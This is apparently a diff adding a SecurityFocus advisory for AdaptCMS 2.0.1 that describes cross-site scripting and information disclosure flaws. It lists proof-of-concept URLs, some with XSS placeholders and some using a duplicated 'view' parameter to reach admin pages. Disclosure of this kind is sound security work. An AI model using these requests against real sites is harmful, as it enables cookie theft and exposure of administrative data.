@@ -1,0 +1,16 @@
+source: http://www.securityfocus.com/bid/49769/info
+
+AdaptCMS is prone to multiple cross-site scripting vulnerabilities and an information disclosure vulnerability because it fails to properly sanitize user-supplied input.
+
+An attacker may leverage these issues to obtain potentially sensitive information and to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and to launch other attacks.
+
+AdaptCMS 2.0.1 is vulnerable; other versions may also be affected. 
+
+http://www.example.com/AdaptCMS/admin.php?view=[XSS]
+http://www.example.com/AdaptCMS/admin.php?view=share&do=[XSS]
+http://www.example.com/AdaptCMS//index.php?'[XSS]
+http://www.example.com/AdaptCMS/admin.php?view=/&view=settings
+http://www.example.com/AdaptCMS/admin.php?view=/&view=users
+http://www.example.com/AdaptCMS/admin.php?view=/&view=groups
+http://www.example.com/AdaptCMS/admin.php?view=/&view=levels
+http://www.example.com/AdaptCMS/admin.php?view=/&view=stats 
